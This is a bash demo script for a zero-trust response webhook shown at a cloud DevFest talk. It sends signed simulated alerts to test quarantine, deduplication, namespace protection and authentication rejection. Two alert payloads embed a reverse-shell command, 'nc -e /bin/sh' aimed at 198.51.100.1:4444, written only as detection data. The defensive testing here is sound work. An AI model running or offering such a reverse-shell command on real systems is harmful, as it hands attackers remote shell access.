#!/usr/bin/env bash
set -eo pipefail

export PATH="$HOME/.local/bin:$HOME/.local/share/uv/python/cpython-3.12.14-linux-x86_64-gnu/bin:$PATH"
export PIP_BREAK_SYSTEM_PACKAGES=1
export PIP_DISABLE_PIP_VERSION_CHECK=1

# Color definitions
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
WEBHOOK_DIR="$REPO_ROOT/cloud-run-webhook"
WEBHOOK_SECRET="devfest2026"
WEBHOOK_PORT="8080"
WEBHOOK_URL="http://127.0.0.1:${WEBHOOK_PORT}"
LOG_FILE="/tmp/ztre-webhook.log"
WEBHOOK_PID=""

cleanup() {
    if [ -n "$WEBHOOK_PID" ] && kill -0 "$WEBHOOK_PID" 2>/dev/null; then
        kill "$WEBHOOK_PID" 2>/dev/null || true
        wait "$WEBHOOK_PID" 2>/dev/null || true
    fi
}
trap cleanup EXIT INT TERM

# 1. Banner
echo -e "${CYAN}========================================================================${NC}"
echo -e "${CYAN}${BOLD}  ZTRE - Zero Trust Response Engine | Cloud DevFest Surabaya '26${NC}"
echo -e "${CYAN}========================================================================${NC}"
echo ""

# 2. Prerequisites check
echo -e "${CYAN}[*] Checking prerequisites...${NC}"
for cmd in python3 pip curl jq openssl; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo -e "${RED}[ERROR] Required command not found: ${cmd}${NC}" >&2
        exit 1
    fi
    echo -e "  ${GREEN}✔${NC} Found ${cmd}"
done
echo ""

# 3. Setup: install dependencies
echo -e "${CYAN}[*] Setting up webhook environment (${WEBHOOK_DIR})...${NC}"
cd "$WEBHOOK_DIR"
pip install -q -r requirements.txt
echo -e "  ${GREEN}✔${NC} Dependencies verified"
echo ""

# 4. Start webhook in DRY_RUN mode
echo -e "${CYAN}[*] Starting ZTRE Serverless Webhook (DRY_RUN=true)...${NC}"
ZTRE_WEBHOOK_SECRET="$WEBHOOK_SECRET" \
ZTRE_DRY_RUN="true" \
GEMINI_API_KEY="" \
uvicorn main:app --port "$WEBHOOK_PORT" > "$LOG_FILE" 2>&1 &
WEBHOOK_PID=$!
echo -e "  ${GREEN}✔${NC} Webhook process spawned (PID: ${WEBHOOK_PID})"

# 5. Wait for health check
echo -e "${CYAN}[*] Waiting for webhook health endpoint...${NC}"
HEALTHY=false
for _ in $(seq 1 30); do
    if curl -s "${WEBHOOK_URL}/healthz" >/dev/null 2>&1; then
        HEALTHY=true
        break
    fi
    sleep 0.5
done

if [ "$HEALTHY" != "true" ]; then
    echo -e "${RED}[ERROR] Webhook failed to become healthy. Output log:${NC}"
    cat "$LOG_FILE"
    exit 1
fi
echo -e "  ${GREEN}✔${NC} Webhook healthy at ${WEBHOOK_URL}"
echo ""
sleep 1

# Demo Step 1 - Health Check
echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
echo -e "${BOLD}Demo Step 1: Health Check${NC}"
echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
curl -s "${WEBHOOK_URL}/healthz" | jq .
echo ""
read -r -p "Press Enter to continue to Step 2..." || true
echo ""

# Demo Step 2 - Attack Simulation (Reverse Shell)
echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
echo -e "${BOLD}Demo Step 2: Attack Simulation (Reverse Shell Detected)${NC}"
echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
sleep 1

ATTACK_PAYLOAD=$(cat <<'EOF'
{
  "event_id": "evt-revshell-4444",
  "timestamp": "2026-11-21T09:00:00Z",
  "cluster_id": "gke-hybrid-01",
  "policy_name": "detect-reverse-shell",
  "severity": "CRITICAL",
  "workload": {
    "namespace": "production-apps",
    "pod_name": "checkout-service-7f89d",
    "uid": "wkl-checkout-pod-01",
    "labels": {
      "app": "checkout-service",
      "env": "production"
    }
  },
  "process": {
    "binary": "/bin/sh",
    "arguments": "-c 'nc -e /bin/sh 198.51.100.1 4444'",
    "parent_binary": "/usr/local/bin/python3",
    "pid": 2048
  }
}
EOF
)

SIGNATURE=$(printf '%s' "$ATTACK_PAYLOAD" | openssl dgst -sha256 -hmac "$WEBHOOK_SECRET" | awk '{print $NF}')
echo -e "Payload: Reverse shell execution via ${BOLD}nc -e /bin/sh${NC}"
echo -e "HMAC Signature: ${CYAN}sha256=${SIGNATURE}${NC}"
echo -e "POSTing alert to ${WEBHOOK_URL}/v1/remediate..."
echo ""

curl -s -X POST "${WEBHOOK_URL}/v1/remediate" \
  -H "Content-Type: application/json" \
  -H "X-ZTRE-Signature: sha256=${SIGNATURE}" \
  --data-binary "$ATTACK_PAYLOAD" | jq .

echo ""
sleep 1.5

# Demo Step 3 - Deduplication
echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
echo -e "${BOLD}Demo Step 3: Alert Deduplication Guardrail${NC}"
echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
echo -e "Resending identical payload within TTL..."
sleep 1

curl -s -X POST "${WEBHOOK_URL}/v1/remediate" \
  -H "Content-Type: application/json" \
  -H "X-ZTRE-Signature: sha256=${SIGNATURE}" \
  --data-binary "$ATTACK_PAYLOAD" | jq .

echo ""
sleep 1.5

# Demo Step 4 - Protected Namespace
echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
echo -e "${BOLD}Demo Step 4: Protected Namespace Blast-Radius Guardrail${NC}"
echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
sleep 1

KUBE_SYSTEM_PAYLOAD=$(cat <<'EOF'
{
  "event_id": "evt-sysbreak-001",
  "timestamp": "2026-11-21T09:00:05Z",
  "cluster_id": "gke-hybrid-01",
  "policy_name": "detect-reverse-shell",
  "severity": "CRITICAL",
  "workload": {
    "namespace": "kube-system",
    "pod_name": "coredns-5dd5756b68-abc",
    "uid": "wkl-coredns-sys-01",
    "labels": {
      "k8s-app": "kube-dns"
    }
  },
  "process": {
    "binary": "/bin/sh",
    "arguments": "-c 'nc -e /bin/sh 198.51.100.1 4444'",
    "parent_binary": "/usr/local/bin/coredns",
    "pid": 4096
  }
}
EOF
)

SYS_SIG=$(printf '%s' "$KUBE_SYSTEM_PAYLOAD" | openssl dgst -sha256 -hmac "$WEBHOOK_SECRET" | awk '{print $NF}')
echo -e "Payload: Alert from protected namespace ${BOLD}kube-system${NC}"
echo -e "POSTing alert to ${WEBHOOK_URL}/v1/remediate..."
echo ""

curl -s -X POST "${WEBHOOK_URL}/v1/remediate" \
  -H "Content-Type: application/json" \
  -H "X-ZTRE-Signature: sha256=${SYS_SIG}" \
  --data-binary "$KUBE_SYSTEM_PAYLOAD" | jq .

echo ""
sleep 1.5

# Demo Step 5 - Auth Rejection
echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
echo -e "${BOLD}Demo Step 5: Authentication Rejection (Missing Signature)${NC}"
echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
echo -e "POSTing alert without X-ZTRE-Signature header..."
sleep 1

AUTH_RESPONSE_FILE="/tmp/ztre-auth-rej.json"
HTTP_CODE=$(curl -s -o "$AUTH_RESPONSE_FILE" -w "%{http_code}" -X POST "${WEBHOOK_URL}/v1/remediate" \
  -H "Content-Type: application/json" \
  --data-binary "$ATTACK_PAYLOAD")

echo -e "HTTP Response Code: ${RED}${HTTP_CODE}${NC}"
cat "$AUTH_RESPONSE_FILE" | jq .
rm -f "$AUTH_RESPONSE_FILE"

echo ""
sleep 1.5

# 11. Cleanup and Summary
echo -e "${CYAN}========================================================================${NC}"
echo -e "${BOLD}Demo Summary & Teardown${NC}"
echo -e "${CYAN}========================================================================${NC}"

cleanup
WEBHOOK_PID=""
rm -f "$LOG_FILE"
echo -e "  ${GREEN}✔${NC} Webhook stopped"
echo -e "  ${GREEN}✔${NC} Step 1: Health check passed"
echo -e "  ${GREEN}✔${NC} Step 2: Reverse shell quarantined via NetworkPolicy & deterministic AI triage"
echo -e "  ${GREEN}✔${NC} Step 3: Duplicate workload alert deduplicated (anti-alert fatigue)"
echo -e "  ${GREEN}✔${NC} Step 4: Protected namespace blast-radius guardrail enforced"
echo -e "  ${GREEN}✔${NC} Step 5: Unsigned request rejected (HTTP 401)"
echo ""
echo -e "${GREEN}${BOLD}Demo completed successfully.${NC}"
